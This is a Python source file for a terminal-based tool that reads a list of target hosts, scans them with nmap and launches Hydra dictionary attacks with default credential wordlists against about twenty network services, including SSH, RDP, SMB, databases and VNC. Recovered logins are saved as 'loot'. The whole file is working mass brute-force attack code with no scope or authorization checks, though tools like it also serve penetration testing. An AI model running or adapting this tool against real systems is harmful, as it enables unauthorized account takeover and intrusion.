import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import curses
import datetime
from threading import Semaphore, Lock
import time
import os
### Configuration ###
max_concurrent_hosts = 20  # Set to desired maximum concurrent hosts
service_parallelism_enabled = True  # Set to True to enable parallel service testing
threads=16 # Set to desired number of threads for Hydra
##########################################################################################################

## wordlist for usernames and passwords ##
user_password_files = {
    'ssh': ('wordlists/ssh_defuser.lst', 'wordlists/ssh_defpass.lst'),
    'ftp': ('wordlists/ftp_defuser.lst', 'wordlists/ftp_defpass.lst'),
    'rdp': ('wordlists/ssh_defuser.lst', 'wordlists/ssh_defpass.lst'),
    'mysql': ('wordlists/sql_defuser.lst', 'wordlists/sql_defpass.lst'),
    'telnet': ('wordlists/telnet_defuser.lst', 'wordlists/telnet_defpass.lst'),
    'sftp': ('wordlists/ftp_defuser.lst', 'wordlists/ftp_defpass.lst'),
    'pop3': ('wordlists/pop_defuser.lst', 'wordlists/pop_defpass.lst'),
    'smb1': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'smb2': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'snmp': (None, 'wordlists/snmp-strings.txt'),
    'http-get': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'ldap': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'rexec': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'smtp': ('wordlists/smtp_defuser.lst', 'wordlists/smtp_defpass.lst'),
    'rlogin': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'rsh': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'imap': ('wordlists/windows-users.txt', 'wordlists/password.lst'),
    'mssql': ('wordlists/mssql-default-userpass.txt',None),
    'oracle': ('wordlists/oracle-default-userpass.txt',None),
    'postgresql': ('wordlists/postgres-default-userpass.txt', None),
    'vnc': ('wordlists/simple-users.txt', 'wordlists/vnc-default-passwords.txt'),
    'irc': ('wordlists/simple-users.txt', 'wordlists/password.lst'),
}


##########################################################################################################

host_semaphore = Semaphore(max_concurrent_hosts)

# List of services to test and their corresponding ports
test_services = {
    'ssh': 22,
    'ftp': 21,
    'rdp': 3389,
    'mysql': 3306,
    'telnet': 23,
    'smtp': 25,
    'sftp': 22,
    'pop3': 110,
    'smb1': 139,   # SMB on port 139
    'smb2': 445,   # SMB on port 445
    'snmp': 162,
    'ldap': 389,
    'rexec': 512,
    'rlogin': 513,
    'rsh': 514,
    'imap': 993,
    'mssql': 1433,
    'oracle': 1521,
    'postgresql': 5432,
    'vnc': 5900,
    'vncauth': 5901,
    'irc': 6667,
}



# Keeps track of the found credentials to prevent duplicates
found_credentials = {}

# Mutex to safely update active thread count across threads
active_threads_lock = Lock()
active_threads_count = 0
logs_dir = 'logs'
if not os.path.exists(logs_dir):
    os.makedirs(logs_dir)

def get_open_ports_nmap(target, log_win):
    """Use nmap to detect open ports for the specified services on the target."""
    try:
        log_win.addstr(f"Scanning {target} for open ports...\n", curses.color_pair(1))
        log_win.refresh()

        result = subprocess.run([ 
            'nmap', '-p', ','.join(map(str, test_services.values())), '--open', '-T4', target, '-oG', '-'
        ], capture_output=True, text=True)
        open_ports = []
        for line in result.stdout.splitlines():
            if 'Ports:' in line:
                ports_info = line.split('Ports:')[1].strip()
                port_entries = ports_info.split(',')
                for port_info in port_entries:
                    try:
                        port, state = port_info.split('/')[0:2]
                        if state == 'open':
                            open_ports.append(int(port))
                    except ValueError:
                        continue

        log_win.addstr(f"Open ports on {target}: {open_ports}\n", curses.color_pair(2))
        log_win.refresh()
        return open_ports
    except Exception as e:
        log_win.addstr(f"Error scanning {target}: {e}\n", curses.color_pair(3))
        log_win.refresh()
        return []


def test_service(target, service, port, log_win, log_file, progress_data, threads):
    """Attempt to test service authentication with credential list."""
    log_win.addstr(f"Testing {service} on {target}:{port}...\n", curses.color_pair(1))
    log_win.refresh()

    # Look up the user and password file from the user_password_files dictionary
    if service == 'ssh':
        user_file, pass_file = user_password_files['ssh']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'ssh://{target}:{port}']
    elif service == 'ftp':
        user_file, pass_file = user_password_files['ftp']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'ftp://{target}:{port}']
    elif service == 'rdp':
        user_file, pass_file = user_password_files['rdp']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'rdp://{target}:{port}']
    elif service == 'mysql':
        user_file, pass_file = user_password_files['mysql']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'mysql://{target}:{port}']
    elif service == 'telnet':
        user_file, pass_file = user_password_files['telnet']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'telnet://{target}:{port}']
    elif service == 'sftp':
        user_file, pass_file = user_password_files['sftp']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'sftp://{target}:{port}']
    elif service == 'pop3':
        user_file, pass_file = user_password_files['pop3']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'pop3://{target}:{port}']
    elif service == 'smb1':
        user_file, pass_file = user_password_files['smb1']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'smb://{target}:{port}']
    elif service == 'smb2':
        user_file, pass_file = user_password_files['smb2']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'smb://{target}:{port}']
    elif service == 'snmp':
        pass_file = user_password_files['snmp'][1]
        command = ['hydra', '-t', str(threads), '-P', pass_file, '-o', log_file, f'snmp://{target}:{port}']
    elif service == 'http-get':
        user_file, pass_file = user_password_files['http-get']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'http-get://{target}:{port}']
    elif service == 'ldap':
        user_file, pass_file = user_password_files['ldap']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'ldap://{target}:{port}']
    elif service == 'rexec':
        user_file, pass_file = user_password_files['rexec']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'rexec://{target}:{port}']
    elif service == 'smtp':
        user_file, pass_file = user_password_files['smtp']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'smtp://{target}:{port}']
    elif service == 'rlogin':
        user_file, pass_file = user_password_files['rlogin']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'rlogin://{target}:{port}']
    elif service == 'rsh':
        user_file, pass_file = user_password_files['rsh']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'rsh://{target}:{port}']
    elif service == 'imap':
        user_file, pass_file = user_password_files['imap']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'imap://{target}:{port}']
    elif service == 'mssql':
        user_file = user_password_files['mssql']
        command = ['hydra', '-t', str(threads), '-C', user_file, '-o', log_file, f'mssql://{target}:{port}']
    elif service == 'oracle':
        user_file, pass_file = user_password_files['oracle']
        command = ['hydra', '-t', str(threads), '-C', user_file,  '-o', log_file, f'oracle://{target}:{port}']
    elif service == 'postgresql':
        user_file, pass_file = user_password_files['postgresql']
        command = ['hydra', '-t', str(threads), '-C', user_file,  '-o', log_file, f'postgresql://{target}:{port}']
    elif service == 'vnc':
        user_file, pass_file = user_password_files['vnc']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'vnc://{target}:{port}']
    elif service == 'irc':
        user_file, pass_file = user_password_files['irc']
        command = ['hydra', '-t', str(threads), '-L', user_file, '-P', pass_file, '-o', log_file, f'irc://{target}:{port}']
    else:
        log_win.addstr(f"Unsupported service: {service}\n", curses.color_pair(2))
        return

    try:
        subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Suppress Hydra output
        
        # Parse results and save any findings
        credentials = parse_hydra_output(log_file)
        if credentials:
            save_loot(target, service, credentials, progress_data)
            log_win.addstr(f"Valid credentials found for {service} on {target}:{port}\n", curses.color_pair(2))
            
    except Exception as e:
        log_win.addstr(f"Error during test on {target}:{port}: {e}\n", curses.color_pair(3))
        
    log_win.addstr(f"Testing completed for {service} on {target}:{port}\n", curses.color_pair(2))
    log_win.refresh()


def check_dependencies():
    """Check if nmap, hydra, and the required wordlists are available."""
    # Check if nmap is installed
    try:
        subprocess.run(['nmap', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        raise RuntimeError("Error: nmap is not installed. Please install nmap and try again.")
    
    # Check if hydra is installed
    try:
        subprocess.run(['hydra', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        raise RuntimeError("Error: hydra is not installed. Please install hydra and try again.")

    # Check if wordlists exist
    for service, (user_file, pass_file) in user_password_files.items():
        if user_file and not os.path.exists(user_file):
            raise RuntimeError(f"Error: Wordlist for {service} user file {user_file} is missing.")
        if pass_file and not os.path.exists(pass_file):
            raise RuntimeError(f"Error: Wordlist for {service} password file {pass_file} is missing.")
    
    print("All dependencies are satisfied.")

def parse_hydra_output(log_file):
    """Parse output file for valid credentials"""
    credentials = []
    try:
        with open(log_file, 'r') as f:
            for line in f:
                if "login:" in line and "password:" in line:
                    # Format the output to match our criteria for storing
                    cred_line = line.strip()
                    credentials.append(cred_line)
    except Exception as e:
        print(f"Error parsing log file: {e}")
    return credentials


def save_loot(target, service, credentials, progress_data):
    """Save discovered credentials to loot file, ensuring no duplicates."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Initialize the set for the target if it does not exist
    if target not in found_credentials:
        found_credentials[target] = set()  # Use a set to prevent duplicates
    
    # Add credentials only if they aren't already present
    for cred in credentials:
        found_credentials[target].add(cred)  # Add the credential to the set

    # Update the loot count with the unique credentials for the target
    progress_data['loot_count'] = sum(len(v) for v in found_credentials.values())

def update_active_threads(increment):
    """Update the active threads count safely."""
    global active_threads_count
    with active_threads_lock:
        active_threads_count += increment


def progress_update(progress_win, progress_data):
    """Update the progress display and show stats in a box, side by side."""
    progress_win.clear()
    max_y, max_x = progress_win.getmaxyx()

    # Check if the terminal has enough space for the layout
    if max_y < 3 or max_x < 50:
        progress_win.addstr(0, 0, "Terminal too small! Resize to view progress.", curses.color_pair(3))
        progress_win.refresh()
        return

    # Draw a box around the progress area
    box_start_x = 0
    box_start_y = 0
    box_width = max_x - 1  # Leave space for the box border
    box_height = 4  # The height of the box

    # Create the box with border
    progress_win.border(0, 0, 0, 0, 0, 0, 0, 0)

    # Side-by-side progress information
    progress_win.addstr(1, 1, f"Hosts: {progress_data['hosts_completed']}/{progress_data['total_hosts']}", curses.color_pair(1))
    progress_win.addstr(1, box_width // 3, f"Services: {progress_data['services_completed']}/{progress_data['total_services']}", curses.color_pair(2))
    progress_win.addstr(1, 2 * box_width // 3, f"Loot: {progress_data['loot_count']} entries", curses.color_pair(1))
    progress_win.addstr(2, 1, f"Active Threads: {active_threads_count}/{max_concurrent_hosts}", curses.color_pair(1))

    # Add a spinning animation while running
    spinner = ['.', '..', '...', '....']  # Simple spinner (you can change this to any characters)
    spin_index = (progress_data['hosts_completed'] + progress_data['services_completed']) % len(spinner)
    spinner_frame = spinner[spin_index]

    # Update footer message with the spinner animation
    if progress_data['hosts_completed'] == progress_data['total_hosts'] and progress_data['services_completed'] == progress_data['total_services']:
        # Use green color for completed status
        status_message = "Completed! Press Ctrl+D to exit"
        progress_win.addstr(3, 1, status_message, curses.color_pair(2))
        
    else:
        status_message = f"Running Bruteforce {spinner_frame} Press Ctrl+C to stop"
        progress_win.addstr(3, 1, status_message, curses.color_pair(1))  # Default color pair

    # Refresh the window to display the updates
    progress_win.refresh()



def process_target(target, log_win, progress_win, progress_data):
    """Process the target by checking for open ports and testing services."""
    # Acquire the semaphore to limit concurrent host processing
    with host_semaphore:
        update_active_threads(1)  # Increment active thread count
        log_file = f'logs/testing_output_{target.strip()}.log'
        open_ports = get_open_ports_nmap(target, log_win)

        if open_ports:
            service_ports = {service: port for service, port in test_services.items() if port in open_ports}

            if 22 in open_ports and 'sftp' in service_ports:
                del service_ports['sftp']  # Avoid duplicate testing of port 22

            progress_data['total_services'] += len(service_ports)
            progress_update(progress_win, progress_data)

            if service_parallelism_enabled:
                # Run services in parallel if parallelism is enabled
                with ThreadPoolExecutor() as executor:
                    futures = []
                    for service, port in service_ports.items():
                        futures.append(executor.submit(test_service, target, service, port, log_win, log_file, progress_data,threads))

                    for future in as_completed(futures):
                        future.result()
                        progress_data['services_completed'] += 1
                        progress_update(progress_win, progress_data)
            else:
                # Run services sequentially if parallelism is disabled
                for service, port in service_ports.items():
                    test_service(target, service, port, log_win, log_file, progress_data,threads)
                    progress_data['services_completed'] += 1
                    progress_update(progress_win, progress_data)
        else:
            log_win.addstr(f"No open ports found on {target}.\n", curses.color_pair(2))
            log_win.refresh()

        progress_data['hosts_completed'] += 1
        progress_update(progress_win, progress_data)

        update_active_threads(-1)  # Decrement active thread count once the target is done
def main(stdscr):
    """Main function to handle the curses interface."""
    # Initialize colors and other curses settings
    curses.start_color()
    curses.init_pair(1, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)

    stdscr.clear()
    stdscr.refresh()
    try:
        check_dependencies()
    except RuntimeError as e:
        stdscr.addstr(0, 0, str(e), curses.color_pair(3))
        stdscr.refresh()
        stdscr.getch()  # Wait for user input before exiting
        return
    # Create windows for logging and progress
    global log_win, progress_win
    
    log_win = curses.newwin(curses.LINES - 4, curses.COLS, 0, 0)
    progress_win = curses.newwin(4, curses.COLS, curses.LINES - 4, 0)

    # Initialize loot file
    with open('loot.txt', 'w') as f:
        f.write(f"=== Security Test Results - Started at {datetime.datetime.now()} ===\n")

    # Read targets
    with open('targets.txt', 'r') as f:
        targets = list(set(target.strip() for target in f.readlines()))

    progress_data = {
        'total_hosts': len(targets),
        'hosts_completed': 0,
        'total_services': 0,
        'services_completed': 0,
        'loot_count': 0
    }

    progress_update(progress_win, progress_data)

    # Process targets with thread pool and semaphore control
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(process_target, target, log_win, progress_win, progress_data) for target in targets]
        for future in as_completed(futures):
            future.result()

    # Write all loot at once after processing all targets
    with open('loot.txt', 'a') as f:
        for target, creds in found_credentials.items():
            f.write(f"\n=== Found at {datetime.datetime.now()} ===\n")
            f.write(f"Target: {target}\n")
            f.write("Credentials found:\n")
            for cred in creds:
                f.write(f"{cred}\n")
            f.write("="*40 + "\n")

    # Continuous redraw loop to handle terminal resize, dragging, and other events
    while True:
        # Check for terminal resize or restore
        if curses.is_term_resized(curses.LINES, curses.COLS):
            max_y, max_x = stdscr.getmaxyx()

            # Resize log_win and progress_win based on the new terminal size
            log_win.resize(max_y - 4, max_x)  # Resize the log window
            progress_win.resize(4, max_x)  # Fixed 4 lines for progress window

            # Reposition the progress_win at the bottom of the terminal
            progress_win.mvwin(max_y - 4, 0)

        # Redraw the progress and log windows
        progress_update(progress_win, progress_data)
        log_win.refresh()  # Refresh log window
        progress_win.refresh()  # Refresh progress window
        stdscr.refresh()  # Ensure the screen is updated

        # Sleep for a short time to avoid 100% CPU usage and allow other operations to happen
        time.sleep(0.1)

        # Listen for Ctrl+D to exit
        key = stdscr.getch()
        if key == 4:  # 4 is the ASCII code for Ctrl+D
            break
# Start the curses application
curses.wrapper(main)